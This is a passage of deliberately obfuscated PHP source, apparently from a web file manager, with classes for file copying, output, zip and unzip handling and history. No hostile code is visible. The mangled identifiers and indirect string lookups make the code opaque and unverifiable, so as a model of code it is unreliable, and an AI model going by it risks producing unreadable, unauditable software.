$ü·£ëÉ§->iconvApp($îôëá³ª); if (substr($îôëá³ª, strlen($¾˜õè®)) == $¾˜õè®) { $‰Ìí¶Ã¼ = !0; } $ÔáÔÈÚ£ = $ş¤®øœ‡->upload($ÌÉ°ŸÊ£, $îôëá³ª, $‰Ìí¶Ã¼); self::remove($£ù–âŠ·); Hook::trigger($é’ö±æº[1167], $ü·£ëÉ§, $ˆ¸Ï§º, $ş¤®øœ‡, $ÌÉ°ŸÊ£, $Éœ¼¤¨õ, $ÔáÔÈÚ£); self::copyMoveKeepInfo($ü·£ëÉ§, $ˆ¸Ï§º, $ÔáÔÈÚ£); return $ÔáÔÈÚ£; } private static function copyMoveKeepInfo($ğûóÀİè, $€óÛù®, $ÕäÁùŸÁ) { if (!$ÕäÁùŸÁ) { return; } $ÇÛò®¼ª = $ğûóÀİè->info($€óÛù®); if (!is_array($ÇÛò®¼ª)) { return; } IO::setModifyTime($ÕäÁùŸÁ, $ÇÛò®¼ª[$_SERVER[™¾ÇÙ¯¹][85]]); } public static function pathFather($ĞÄ»Ø²ƒ) { $ªŒÄÌßà = IO::init($ĞÄ»Ø²ƒ); $ñˆ‡°Éû = $ªŒÄÌßà->pathFather($ªŒÄÌßà->path); return $ªŒÄÌßà->getPathOuter($ñˆ‡°Éû); } public static function fileOut($š±˜ÓÒ¿, $ÍÅ çÈ = false, $¬±‹×Ó€ = false, $«é«óÂò = '') { $ßµ¼½İÒ = self::driverMake($š±˜ÓÒ¿); if ($ßµ¼½İÒ->isFileOutServer()) { return $ßµ¼½İÒ->fileOutServer($š±˜ÓÒ¿, $ÍÅ çÈ, $¬±‹×Ó€, $«é«óÂò); } return $ßµ¼½İÒ->fileOut($š±˜ÓÒ¿, $ÍÅ çÈ, $¬±‹×Ó€, $«é«óÂò); } public static function fileOutImage($ıñĞ›®’, $èÆ²ø¢’ = 250) { $ëÕˆï„ú = array(250, 600, 1200, 2000, 3000, 5000); for ($ışšŸ = 0; $ışšŸ < count($ëÕˆï„ú); $ışšŸ++) { if ($ışšŸ == 0 && $èÆ²ø¢’ <= $ëÕˆï„ú[$ışšŸ]) { $èÆ²ø¢’ = $ëÕˆï„ú[$ışšŸ]; break; } else { if ($èÆ²ø¢’ > $ëÕˆï„ú[$ışšŸ - 1] && $èÆ²ø¢’ <= $ëÕˆï„ú[$ışšŸ]) { $èÆ²ø¢’ = $ëÕˆï„ú[$ışšŸ]; break; } else { if ($ışšŸ == count($ëÕˆï„ú) - 1 && $èÆ²ø¢’ > $ëÕˆï„ú[$ışšŸ]) { $èÆ²ø¢’ = $ëÕˆï„ú[$ışšŸ]; break; } } } } $İ¾…ĞÕ = self::driverMake($ıñĞ›®’); if ($İ¾…ĞÕ->isFileOutServer()) { return $İ¾…ĞÕ->fileOutImageServer($ıñĞ›®’, $èÆ²ø¢’); } return $İ¾…ĞÕ->fileOutImage($ıñĞ›®’, $èÆ²ø¢’); } private static function driverIsSame($ëÖù¯Õ, $æ‘€‘œÒ) { $™¡‡‡ =& $_SERVER[™¾ÇÙ¯¹]; $…üÑ‹Œ’ = $ëÖù¯Õ->getType(); $é‰óÊæ“ = $æ‘€‘œÒ->getType(); if ($…üÑ‹Œ’ != $é‰óÊæ“) { return !1; } if ($…üÑ‹Œ’ == $™¡‡‡[773]) { return !0; } if ($…üÑ‹Œ’ == $™¡‡‡[106]) { return !0; } if ($ëÖù¯Õ->pathDriver == $æ‘€‘œÒ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¯ĞµáÀú, $Œ¿ÑÛ„) { $±€³Ê‚ê =& $_SERVER[™¾ÇÙ¯¹]; if (!IO::exist($¯ĞµáÀú)) { return !1; } if (!IO::exist($Œ¿ÑÛ„)) { IO::mkdir($Œ¿ÑÛ„); } $ªº¤…Áƒ = self::_listAll($¯ĞµáÀú); $éşì˜œ = self::_listAll($Œ¿ÑÛ„); $üÅÛ‰ÅÉ = array(); $·Â±€Ô = array(); foreach ($ªº¤…Áƒ as $Ì°·‘éß => $¦œÙ×£²) { if (isset($éşì˜œ[$Ì°·‘éß])) { if ($¦œÙ×£²[$±€³Ê‚ê[75]] == 1) { continue; } if ($éşì˜œ[$Ì°·‘éß][$±€³Ê‚ê[76]] == $¦œÙ×£²[$±€³Ê‚ê[76]]) { continue; } } if ($¦œÙ×£²[$±€³Ê‚ê[75]] == 1) { $·Â±€Ô[] = $Œ¿ÑÛ„ . $±€³Ê‚ê[8] . $Ì°·‘éß; continue; } $œëôˆ£â = strstr(trim($Ì°·‘éß, $±€³Ê‚ê[8]), $±€³Ê‚ê[8]) ? get_path_father($Ì°·‘éß) : $±€³Ê‚ê[12]; $üÅÛ‰ÅÉ[] = array($±€³Ê‚ê[1168] => $¦œÙ×£²[$±€³Ê‚ê[84]], $±€³Ê‚ê[1169] => rtrim($Œ¿ÑÛ„, $±€³Ê‚ê[8]) . $±€³Ê‚ê[8] . $œëôˆ£â, $±€³Ê‚ê[1170] => $¦œÙ×£²); } $ÉÏ÷±Ä = array($±€³Ê‚ê[199] => $üÅÛ‰ÅÉ, $±€³Ê‚ê[75] => $·Â±€Ô); Hook::trigger($±€³Ê‚ê[1171], $¯ĞµáÀú, $Œ¿ÑÛ„, $ÉÏ÷±Ä); foreach ($·Â±€Ô as $¦œÙ×£²) { IO::mkdir($¦œÙ×£²); } foreach ($üÅÛ‰ÅÉ as $¦œÙ×£²) { IO::copy($¦œÙ×£²[$±€³Ê‚ê[1168]], $¦œÙ×£²[$±€³Ê‚ê[1169]], REPEAT_REPLACE); } } private static function _listAll($ª¯Ššƒ) { $µšà€®æ =& $_SERVER[™¾ÇÙ¯¹]; $ª¯Ššƒ = KodIO::clear($ª¯Ššƒ); $î¶­ª·Î = IO::listAll($ª¯Ššƒ); foreach ($î¶­ª·Î as &$©É…¦Šñ) { $ÈŸ˜ï’¨ = substr($©É…¦Šñ[$µšà€®æ[84]], strlen($ª¯Ššƒ)); $©É…¦Šñ[$µšà€®æ[1172]] = trim($ÈŸ˜ï’¨, $µšà€®æ[8]); } unset($©É…¦Šñ); return array_to_keyvalue($î¶­ª·Î, $µšà€®æ[1172]); } public static function fileSubstr($•ÌÜœç³, $ßñ¶¦–Ö, $ëãµ°ò† = false) { $Ê›œúÓŠ =& $_SERVER[™¾ÇÙ¯¹]; $ı ÊÕ¨ = self::driverMake($•ÌÜœç³); $İ—áÎ›Ú = $ı ÊÕ¨->size($•ÌÜœç³); $ìÒ¼–Óï = $ßñ¶¦–Ö; $³«Œˆêü = $ëãµ°ò†; if ($ßñ¶¦–Ö < 0) { $ßñ¶¦–Ö = $İ—áÎ›Ú + $ßñ¶¦–Ö; } if ($ëãµ°ò† === !1) { $ëãµ°ò† = $İ—áÎ›Ú - $ßñ¶¦–Ö; } if ($ßñ¶¦–Ö + $ëãµ°ò† > $İ—áÎ›Ú) { $ëãµ°ò† = $İ—áÎ›Ú - $ßñ¶¦–Ö; } if (!$İ—áÎ›Ú && $ı ÊÕ¨->getType() == $Ê›œúÓŠ[106] && !$ı ÊÕ¨->exist($•ÌÜœç³)) { $† “ª«Š = get_path_this($•ÌÜœç³); $ìÌÉÂ×Ÿ = parse_url_query($† “ª«Š); if (is_array($ìÌÉÂ×Ÿ) && isset($ìÌÉÂ×Ÿ[$Ê›œúÓŠ[32]])) { $† “ª«Š = urldecode($ìÌÉÂ×Ÿ[$Ê›œúÓŠ[32]]); } throw new Exception($Ê›œúÓŠ[1173] . LNG($Ê›œúÓŠ[1174]) . $Ê›œúÓŠ[974] . clear_html($† “ª«Š) . $Ê›œúÓŠ[12]); } if ($ëãµ°ò† <= 0) { return $Ê›œúÓŠ[12]; } if ($ßñ¶¦–Ö < 0 || $ßñ¶¦–Ö >= $İ—áÎ›Ú || $ëãµ°ò† > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\x52\145\141\144\40\x65\x72\x72\x6f\162\41\x20\x73\164\x61\x72\164\75{$ßñ¶¦–Ö}\x3b\154\x65\156\x67\x74\150\75{$ëãµ°ò†}\x3b\40\x73\151\x7a\x65\x3d{$İ—áÎ›Ú}\x3b"); } $ñòµı„¾ = $ı ÊÕ¨->fileSubstr($•ÌÜœç³, $ßñ¶¦–Ö, $ëãµ°ò†); if (!$ñòµı„¾ && $ëãµ°ò† && isset($GLOBALS[$Ê›œúÓŠ[1175]])) { throw new Exception($GLOBALS[$Ê›œúÓŠ[1175]][$Ê›œúÓŠ[1176]]); } return $ñòµı„¾; } private static function driverMake(&$”›®«†ü) { $ªâ³ç¹Ù =& $_SERVER[™¾ÇÙ¯¹]; $ ò‘‚Ë¿ = KodIO::parse($”›®«†ü); if (!self::$driverListSystem) { $¼ ×·êÉ = Model($ªâ³ç¹Ù[782])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¼ ×·êÉ, $ªâ³ç¹Ù[407]); } if ($ ò‘‚Ë¿[$ªâ³ç¹Ù[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ ò‘‚Ë¿[$ªâ³ç¹Ù[407]]]) { return !1; } $”›®«†ü = $ ò‘‚Ë¿[$ªâ³ç¹Ù[1177]]; $ÖĞ¶âùë = self::driverGet($ ò‘‚Ë¿, $”›®«†ü); return $ÖĞ¶âùë; } private static function driverGet($Öµ“Êé¡, &$‰±àÀ) { $æĞì˜©§ =& $_SERVER[™¾ÇÙ¯¹]; $ã±Æ¼Ë = $Öµ“Êé¡[$æĞì˜©§[1178]]; $óüÓÒÉÑ = $Öµ“Êé¡[$æĞì˜©§[407]]; switch ($Öµ“Êé¡[$æĞì˜©§[33]]) { case KodIO::KOD_IO: $©ìæÃ = self::$driverListSystem[$óüÓÒÉÑ]; break; case KodIO::KOD_SOURCE: $‰±àÀ = $óüÓÒÉÑ . $‰±àÀ; $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1180], $æĞì˜©§[6] => $Öµ“Êé¡); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ôşı¸¦– = $GLOBALS[$æĞì˜©§[1181]]; self::$driverListUser = array_to_keyvalue($Ôşı¸¦–, $æĞì˜©§[407]); } $©ìæÃ = self::$driverListUser[$óüÓÒÉÑ]; break; case KodIO::KOD_SHARE_LINK: $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1182], $æĞì˜©§[6] => $Öµ“Êé¡); $°çÒø “ = Action($æĞì˜©§[1183])->sharePathInfo($Öµ“Êé¡[$æĞì˜©§[84]]); $‰±àÀ = $°çÒø “[$æĞì˜©§[410]]; if (!$°çÒø “[$æĞì˜©§[410]]) { $ÖÊ•¦Âş = Model($æĞì˜©§[609])->getInfo($°çÒø “[$æĞì˜©§[497]]); $‰±àÀ = KodIO::clear($ÖÊ•¦Âş[$æĞì˜©§[1184]] . $Öµ“Êé¡[$æĞì˜©§[1177]]); $Öµ“Êé¡[$æĞì˜©§[495]] = $ÖÊ•¦Âş; $Öµ“Êé¡[$æĞì˜©§[1159]] = $‰±àÀ; $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1185], $æĞì˜©§[6] => $Öµ“Êé¡); } break; case KodIO::KOD_SHARE_ITEM: $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1186], $æĞì˜©§[6] => $Öµ“Êé¡); $ÖÊ•¦Âş = Model($æĞì˜©§[609])->getInfo($Öµ“Êé¡[$æĞì˜©§[407]]); if ($ÖÊ•¦Âş[$æĞì˜©§[410]] == $æĞì˜©§[197]) { $‰±àÀ = KodIO::clear($ÖÊ•¦Âş[$æĞì˜©§[1184]] . $Öµ“Êé¡[$æĞì˜©§[1177]]); $Öµ“Êé¡[$æĞì˜©§[495]] = $ÖÊ•¦Âş; $Öµ“Êé¡[$æĞì˜©§[1159]] = $‰±àÀ; $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1187], $æĞì˜©§[6] => $Öµ“Êé¡); } else { if (!$‰±àÀ) { $‰±àÀ = $ÖÊ•¦Âş[$æĞì˜©§[410]]; } } break; default: $‰±àÀ = $Öµ“Êé¡[$æĞì˜©§[84]]; $©ìæÃ = array($æĞì˜©§[1179] => $æĞì˜©§[1188]); break; } $¨Œµ°‰Ş = $Öµ“Êé¡[$æĞì˜©§[84]]; if (!isset(self::$driverCache[$¨Œµ°‰Ş])) { $İ™å” = strtolower($©ìæÃ[$æĞì˜©§[95]]); $Ò¦¶Ï‹ê = $GLOBALS[$æĞì˜©§[6]][$æĞì˜©§[89]][$æĞì˜©§[841]]; $„ØĞ‡Øç = $æĞì˜©§[74] . (isset($Ò¦¶Ï‹ê[$İ™å”]) ? $Ò¦¶Ï‹ê[$İ™å”] : ucfirst($İ™å”)); if (!class_exists($„ØĞ‡Øç)) { show_json("{$„ØĞ‡Øç}\x20\x6e\x6f\164\40\145\170\151\x73\x74\x73\41", !1); } $öˆñ‘…˜ = isset($©ìæÃ[$æĞì˜©§[6]]) ? $©ìæÃ[$æĞì˜©§[6]] : !1; self::$driverCache[$¨Œµ°‰Ş] = new $„ØĞ‡Øç($öˆñ‘…˜); } $’Úô„ = self::$driverCache[$¨Œµ°‰Ş]; $’Úô„->pathDriver = $ã±Æ¼Ë; $’Úô„->pathBase = $æĞì˜©§[12]; if (isset($©ìæÃ[$æĞì˜©§[6]][$æĞì˜©§[1189]])) { $’Úô„->pathBase = rtrim($©ìæÃ[$æĞì˜©§[6]][$æĞì˜©§[1189]], $æĞì˜©§[8]) . $æĞì˜©§[8]; $‰±àÀ = $’Úô„->pathBase . ltrim($‰±àÀ, $æĞì˜©§[8]); } $‰±àÀ = $’Úô„->getPath($‰±àÀ); if (isset($Öµ“Êé¡[$æĞì˜©§[1159]])) { $‰±àÀ = $Öµ“Êé¡[$æĞì˜©§[1159]]; } $’Úô„->path = $‰±àÀ; return $’Úô„; } public static function errorTips($„Ğ«İó½ = false) { $©ÏÍÛ÷ª =& $_SERVER[™¾ÇÙ¯¹]; static $Ö±ÄÕ´ = array(); $èêÉÍó  = 1000; if ($„Ğ«İó½ === -1) { return $Ö±ÄÕ´ ? $Ö±ÄÕ´[count($Ö±ÄÕ´) - 1] : $©ÏÍÛ÷ª[12]; } if ($„Ğ«İó½ === !1) { return implode($©ÏÍÛ÷ª[231], $Ö±ÄÕ´); } if (count($Ö±ÄÕ´) >= $èêÉÍó ) { $Ö±ÄÕ´ = array_slice($Ö±ÄÕ´, $èêÉÍó  * 0.5, $èêÉÍó ); } $Ö±ÄÕ´[] = $„Ğ«İó½; write_log($©ÏÍÛ÷ª[162] . ACTION . $©ÏÍÛ÷ª[1190] . $„Ğ«İó½, $©ÏÍÛ÷ª[1191]); } public static function getLastError($ÆŞÀäğê = '') { $´ı­„¶ª = self::errorTips(-1); return $´ı­„¶ª ? $´ı­„¶ª : $ÆŞÀäğê; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ß½Ğîºô; if (!$ß½Ğîºô) { $×ó‡áÔ = IO::init($_SERVER[™¾ÇÙ¯¹][8]); } return $×ó‡áÔ; } private static function iconvSystem($‚ÄúÏ¢) { return self::local()->iconvSystem($‚ÄúÏ¢); } private static function iconvApp($ßøĞªä†) { return self::local()->iconvApp($ßøĞªä†); } public static function zip($¬Û¯‹šµ, $õç¡³Ìî = "\x7a\151\160", $´ÅãÏ€Š = '', $­ÄÔ®õâ = REPEAT_RENAME) { $¹²Ö˜‘Ü =& $_SERVER[™¾ÇÙ¯¹]; $Ø—¢‘ÂÖ = self::init($¬Û¯‹šµ[0][$¹²Ö˜‘Ü[84]]); $ÁıÜşôğ = self::info($¬Û¯‹šµ[0][$¹²Ö˜‘Ü[84]]); $†×˜½½™ = !1; if (!$´ÅãÏ€Š && $Ø—¢‘ÂÖ->getType() == $¹²Ö˜‘Ü[106]) { $‘ÊŸ”º„ = self::zipFileList($¬Û¯‹šµ); } else { $†×˜½½™ = $´ÅãÏ€Š ? $´ÅãÏ€Š : TEMP_FILES . $¹²Ö˜‘Ü[1192] . time() . rand_string(8) . $¹²Ö˜‘Ü[8]; mk_dir($†×˜½½™); $‘ÊŸ”º„ = self::zipFileList($¬Û¯‹šµ, $†×˜½½™); } $Ü“Ï¨€ = $ÁıÜşôğ[$¹²Ö˜‘Ü[32]]; if (count($‘ÊŸ”º„) > 1) { $ÎöŒØ™’ = IO::info(IO::pathFather($ÁıÜşôğ[$¹²Ö˜‘Ü[84]])); $Ü“Ï¨€ = $ÎöŒØ™’[$¹²Ö˜‘Ü[32]]; } $ÛİÉÂÉ¾ = $†×˜½½™; if (!$ÛİÉÂÉ¾) { $ÛİÉÂÉ¾ = get_path_father($ÁıÜşôğ[$¹²Ö˜‘Ü[84]]); if (!$´ÅãÏ€Š && $Ø—¢‘ÂÖ->getType() == $¹²Ö˜‘Ü[106]) { $ÛİÉÂÉ¾ = get_path_father($Ø—¢‘ÂÖ->path); } $ÓÕØ„ğ” = IO::info($ÛİÉÂÉ¾); if (!$ÓÕØ„ğ”[$¹²Ö˜‘Ü[202]]) { show_json(LNG($¹²Ö˜‘Ü[1193]), !1); } } $¿¾Î¡ù¬ = $ÛİÉÂÉ¾ . $Ü“Ï¨€ . $¹²Ö˜‘Ü[10] . $õç¡³Ìî; $¿¾Î¡ù¬ = get_filename_auto($¿¾Î¡ù¬, $¹²Ö˜‘Ü[12], $­ÄÔ®õâ); $úç‚î†Ú = self::iconvSystem($¿¾Î¡ù¬); foreach ($‘ÊŸ”º„ as $×Š½Ú¢Ş => $ş‡ĞäüÏ) { $‘ÊŸ”º„[$×Š½Ú¢Ş] = self::iconvSystem($ş‡ĞäüÏ); } KodArchive::create($úç‚î†Ú, $‘ÊŸ”º„); if (!IO::exist($¿¾Î¡ù¬)) { if ($†×˜½½™) { del_dir($†×˜½½™); } show_json(LNG($¹²Ö˜‘Ü[1194]), !1); } if ($´ÅãÏ€Š || !$†×˜½½™) { if ($†×˜½½™ && strstr($†×˜½½™, TEMP_FILES)) { $Æ±ªÑƒº = $‘ÊŸ”º„ = array(); recursion_dir($ÛİÉÂÉ¾, $Æ±ªÑƒº, $‘ÊŸ”º„, 0); foreach ($Æ±ªÑƒº as $»å’¶Ÿğ) { del_dir($»å’¶Ÿğ); } foreach ($‘ÊŸ”º„ as $°æ³åğ) { if ($°æ³åğ == $úç‚î†Ú) { continue; } del_file($°æ³åğ); } } return $¿¾Î¡ù¬; } $á§Ìí = self::pathFather($ÁıÜşôğ[$¹²Ö˜‘Ü[84]]); $¶¢¬İ„® = self::move($¿¾Î¡ù¬, $á§Ìí, $­ÄÔ®õâ); if (!$¶¢¬İ„®) { del_dir($†×˜½½™); show_json(LNG($¹²Ö˜‘Ü[1194]), !1); } del_dir($†×˜½½™); return $¶¢¬İ„®; } public static function unzip($òÁÕšêá, $”òÁÔø = "\162\145\160\x6c\x61\143\x65") { $ÜœÖ‰¬ê =& $_SERVER[™¾ÇÙ¯¹]; $¤¬ë†Õ = $òÁÕšêá[$ÜœÖ‰¬ê[84]]; $óù©… = $òÁÕšêá[$ÜœÖ‰¬ê[1195]]; if (!($´Éİ¹™Ø = parent::info($¤¬ë†Õ))) { show_json(LNG($ÜœÖ‰¬ê[1196]), !1); } if (!($¿±Ë¤Â» = parent::infoFull($óù©…))) { $óù©… = parent::mkdir($óù©…); $¿±Ë¤Â» = array($ÜœÖ‰¬ê[84] => $óù©…); } else { if (isset($¿±Ë¤Â»[$ÜœÖ‰¬ê[410]]) && trim($¿±Ë¤Â»[$ÜœÖ‰¬ê[84]], $ÜœÖ‰¬ê[8]) != trim($óù©…, $ÜœÖ‰¬ê[8])) { $ ¤äèÄö = KodIO::make($¿±Ë¤Â»[$ÜœÖ‰¬ê[440]]); $÷áŸ†àĞ = parent::fileNameAuto($ ¤äèÄö, $¿±Ë¤Â»[$ÜœÖ‰¬ê[32]], REPEAT_RENAME_FOLDER, !0); $óù©… = parent::mkdir($ ¤äèÄö . $÷áŸ†àĞ); $¿±Ë¤Â» = array($ÜœÖ‰¬ê[84] => $óù©…); } } $óù©… = $¿±Ë¤Â»[$ÜœÖ‰¬ê[84]]; $ÙÃ“ô¾İ = self::tmpFileName($´Éİ¹™Ø); $Ò’”ä‡† = TEMP_FILES . $ÙÃ“ô¾İ; del_dir($Ò’”ä‡†); mk_dir($Ò’”ä‡†); $¾“©îÂŠ = self::fileExt($´Éİ¹™Ø); $æÆñÛÈÔ = $Ò’”ä‡† . $ÜœÖ‰¬ê[10] . $¾“©îÂŠ; if (!@file_exists(self::iconvSystem($æÆñÛÈÔ))) { $çÄ¸€ûù = self::localFilePath($¤¬ë†Õ, $¾“©îÂŠ); $æÆñÛÈÔ = $çÄ¸€ûù ? $çÄ¸€ûù : parent::download($¤¬ë†Õ, $æÆñÛÈÔ); } $æÆñÛÈÔ = self::iconvSystem($æÆñÛÈÔ); $°‰·æä = isset($òÁÕšêá[$ÜœÖ‰¬ê[1197]]) ? $òÁÕšêá[$ÜœÖ‰¬ê[1197]] : $ÜœÖ‰¬ê[1198]; $äğ¨ÀáÔ = KodArchive::extract($æÆñÛÈÔ, $Ò’”ä‡† . $ÜœÖ‰¬ê[8], $°‰·æä); self::archiveExt(); if (!$äğ¨ÀáÔ[$ÜœÖ‰¬ê[1199]]) { show_json($ÜœÖ‰¬ê[1200] . $äğ¨ÀáÔ[$ÜœÖ‰¬ê[1201]], !1); } Hook::trigger($ÜœÖ‰¬ê[1202], $Ò’”ä‡†); recursion_dir($Ò’”ä‡†, $Í¥ƒ÷âõ, $­Õù°, 0); $°‰¤ó¹® = array_merge($Í¥ƒ÷âõ, $­Õù°); foreach ($°‰¤ó¹® as $´¶²é™ã) { $´¶²é™ã = self::iconvApp($´¶²é™ã); self::move($´¶²é™ã, $óù©…, $”òÁÔø); } del_dir($Ò’”ä‡†); if (!$çÄ¸€ûù) { del_file($æÆñÛÈÔ); } return !0; } public static function unzipList($ÚÃÅÁšß) { $á×ıåÎ… =& $_SERVER[™¾ÇÙ¯¹]; $è¹ú€æö = $ÚÃÅÁšß[$á×ıåÎ…[84]]; $Ù²ù©¯× = isset($ÚÃÅÁšß[$á×ıåÎ…[1203]]) ? $ÚÃÅÁšß[$á×ıåÎ…[1203]] : -1; $³Ú„íäÃ = 50000; if (request_url_safe($è¹ú€æö)) { $õ³òáè‚ = parse_url_query($è¹ú€æö); if (!isset($õ³òáè‚[$á×ıåÎ…[84]])) { show_json($á×ıåÎ…[1204], !1); } } $”¿®¤¡Ì = isset($õ³òáè‚) ? $õ³òáè‚[$á×ıåÎ…[84]] : $è¹ú€æö; $®şïºû» = self::info($”¿®¤¡Ì); $òÑÊ¡ì = self::fileExt($®şïºû»); $î»êƒ˜ = self::tmpFileName($®şïºû»); if (isset($õ³òáè‚)) { $íı‘ì¡¨ = array($õ³òáè‚[$á×ıåÎ…[84]], $õ³òáè‚[$á×ıåÎ…[1203]], $õ³òáè‚[$á×ıåÎ…[32]]); $òş¦ç€ = md5(implode($á×ıåÎ…[11], $íı‘ì¡¨)) . $á×ıåÎ…[10] . get_path_ext($õ³òáè‚[$á×ıåÎ…[32]]); } else { $íı‘ì¡¨ = array($®şïºû»[$á×ıåÎ…[32]], $®şïºû»[$á×ıåÎ…[84]], $®şïºû»[$á×ıåÎ…[76]]); $òş¦ç€ = md5(implode($á×ıåÎ…[11], $íı‘ì¡¨)) . $á×ıåÎ…[10] . $òÑÊ¡ì; } if ($Ù²ù©¯× == -1) { $£–»—ƒÙ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\151\145\x77\x2f{$î»êƒ˜}\x2f{$òş¦ç€}\x2e\x6c\x6f\147"; $¨ğ´– = self::infoFull($£–»—ƒÙ); if ($¨ğ´–) { $£–»—ƒÙ = $¨ğ´–[$á×ıåÎ…[84]]; $®ëöÕã± = self::getContent($£–»—ƒÙ); if ($®ëöÕã±) { $â¨£“±­ = json_decode($®ëöÕã±, !0); $â¨£“±­ = is_array($â¨£“±­) ? $â¨£“±­ : array(); if (count($â¨£“±­) >= $³Ú„íäÃ) { show_json(sprintf(LNG($á×ıåÎ…[1205]), count($â¨£“±­)), !1); } return $â¨£“±­; } } else { $£–»—ƒÙ = self::mkfile($£–»—ƒÙ); } } $éÈ£ïß­ = TEMP_FILES . $î»êƒ˜; if (!is_dir($éÈ£ïß­)) { mk_dir($éÈ£ïß­); } $ÃßÄ”³ï = $éÈ£ïß­ . $á×ıåÎ…[8] . $òş¦ç€; if (!@file_exists(self::iconvSystem($ÃßÄ”³ï))) { if (isset($õ³òáè‚)) { url_request($è¹ú€æö, $á×ıåÎ…[1206], $ÃßÄ”³ï); } else { $ôÙÓ§„ = self::localFilePath($è¹ú€æö, $òÑÊ¡ì); $ÃßÄ”³ï = $ôÙÓ§„ ? $ôÙÓ§„ : self::download($è¹ú€æö, $ÃßÄ”³ï); } } $ÃßÄ”³ï = self::iconvSystem($ÃßÄ”³ï); if ($Ù²ù©¯× >= 0) { $²÷ ûûá = isset($ÚÃÅÁšß[$á×ıåÎ…[1207]]) ? $ÚÃÅÁšß[$á×ıåÎ…[1207]] : !1; $ÕİòÜ‹À = isset($ÚÃÅÁšß[$á×ıåÎ…[32]]) ? $ÚÃÅÁšß[$á×ıåÎ…[32]] : $á×ıåÎ…[12]; KodArchive::filePreview($ÃßÄ”³ï, $Ù²ù©¯×, $²÷ ûûá, $ÕİòÜ‹À); self::archiveExt(); die; } $şÙŞÙ„• = KodArchive::listContent($ÃßÄ”³ï); self::archiveExt(); del_dir($éÈ£ïß­); if (!$şÙŞÙ„•[$á×ıåÎ…[1199]]) { show_json($şÙŞÙ„•[$á×ıåÎ…[1201]], !1); } $â¨£“±­ = json_encode($şÙŞÙ„•[$á×ıåÎ…[1201]]); self::setContent($£–»—ƒÙ, $â¨£“±­); if (count($şÙŞÙ„•[$á×ıåÎ…[1201]]) >= $³Ú„íäÃ) { show_json(sprintf(LNG($á×ıåÎ…[1205]), count($şÙŞÙ„•[$á×ıåÎ…[1201]])), !1); } return $şÙŞÙ„•[$á×ıåÎ…[1201]]; } private static function fileExt($¾ñªç¸Ã) { $Ù„†ş–ñ =& $_SERVER[™¾ÇÙ¯¹]; $‘êá®€£ = $¾ñªç¸Ã[$Ù„†ş–ñ[174]]; if ($‘êá®€£ == $Ù„†ş–ñ[1208]) { $¹ÄŞ÷â¸ = $Ù„†ş–ñ[1209]; if (substr($¾ñªç¸Ã[$Ù„†ş–ñ[32]], -strlen($¹ÄŞ÷â¸)) == $¹ÄŞ÷â¸) { $‘êá®€£ = $Ù„†ş–ñ[1210]; } } self::archiveExt($‘êá®€£); return $‘êá®€£; } private static function zipFileList($¡ÓìÛèÚ, $üô§âã = false) { $İÒÚ¸‰ =& $_SERVER[™¾ÇÙ¯¹]; $Ó½ïá¯ò = array(); foreach ($¡ÓìÛèÚ as $‰‰µ¢¦) { $ÈÌêÅÖò = $‰‰µ¢¦[$İÒÚ¸‰[84]]; if ($üô§âã) { $ÈÌêÅÖò = self::copy($‰‰µ¢¦[$İÒÚ¸‰[84]], $üô§âã, $İÒÚ¸‰[833]); } else { $ÜöÊÌ· = self::init($‰‰µ¢¦[$İÒÚ¸‰[84]]); if ($ÜöÊÌ·->getType() == $İÒÚ¸‰[106]) { $ÈÌêÅÖò = $ÜöÊÌ·->path; } } if ($ÈÌêÅÖò && self::local()->exist($ÈÌêÅÖò)) { $Ó½ïá¯ò[$‰‰µ¢¦[$İÒÚ¸‰[84]]] = $ÈÌêÅÖò; } } if (!empty($Ó½ïá¯ò)) { return array_values($Ó½ïá¯ò); } show_json(LNG($İÒÚ¸‰[1174]), !1); } public static function tmpFileName($Ãî—Ğ–¬) { $æĞ·±™÷ =& $_SERVER[™¾ÇÙ¯¹]; $ç‹Åâ°õ = array($Ãî—Ğ–¬[$æĞ·±™÷[32]], $Ãî—Ğ–¬[$æĞ·±™÷[84]], $Ãî—Ğ–¬[$æĞ·±™÷[76]], $Ãî—Ğ–¬[$æĞ·±™÷[529]]); return md5(implode($æĞ·±™÷[11], $ç‹Åâ°õ)); } private static function localFilePath($¿ƒè’”Ò, $‘ô¯è¤Å) { $ş­½ïè =& $_SERVER[™¾ÇÙ¯¹]; if ($‘ô¯è¤Å == $ş­½ïè[1211] && strtoupper(substr(PHP_OS, 0, 3)) == $ş­½ïè[1212]) { return !1; } $Â•»“¥‚ = KodIO::parse($¿ƒè’”Ò); if ($Â•»“¥‚[$ş­½ïè[33]] == KodIO::KOD_SOURCE) { $•‰÷ùª¡ = Model($ş­½ïè[840])->fileInfoGet(KodIO::sourceID($¿ƒè’”Ò)); if (!$•‰÷ùª¡[$ş­½ïè[84]]) { show_json($ş­½ïè[1213], !1); } $¿ƒè’”Ò = $•‰÷ùª¡[$ş­½ïè[84]]; } $Š¨ºˆàÑ = self::init($¿ƒè’”Ò); if ($Š¨ºˆàÑ->pathParse[$ş­½ïè[1159]]) { $¿ƒè’”Ò = $Š¨ºˆàÑ->pathParse[$ş­½ïè[1159]]; $Š¨ºˆàÑ = self::init($¿ƒè’”Ò); } $–»÷ªµ = $Š¨ºˆàÑ->getType(); if ($–»÷ªµ == $ş­½ïè[106] || $–»÷ªµ == $ş­½ïè[1214]) { if (!$Š¨ºˆàÑ->exist($Š¨ºˆàÑ->path)) { show_json(LNG($ş­½ïè[105]), !1); } return $Š¨ºˆàÑ->path; } return !1; } private static function archiveExt($–š²ÁÌ = '') { $GLOBALS[$_SERVER[™¾ÇÙ¯¹][1215]] = $–š²ÁÌ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $íãÆ˜ñ =& $_SERVER[™¾ÇÙ¯¹]; $œùå·–÷ = $GLOBALS[$íãÆ˜ñ[6]][$íãÆ˜ñ[89]]; if ($œùå·–÷[$íãÆ˜ñ[1216]] != 1) { return; } if 